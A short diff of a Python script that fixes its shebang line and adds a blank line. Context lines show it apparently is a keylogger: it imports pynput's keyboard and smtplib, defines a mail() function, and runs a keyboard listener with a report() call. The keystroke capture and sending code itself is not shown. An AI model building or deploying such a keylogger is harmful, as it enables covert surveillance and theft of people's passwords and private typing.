@@ -1,4 +1,4 @@
-#!usr/bin/env python
+#!/usr/bin/env python
 from pynput import keyboard
 import threading
 import smtplib
@@ -41,4 +41,5 @@ def mail():
 #listener to monitor the keyboard keys
 with keyboard.Listener(on_press=on_press) as listener:
     report()
+
     listener.join()
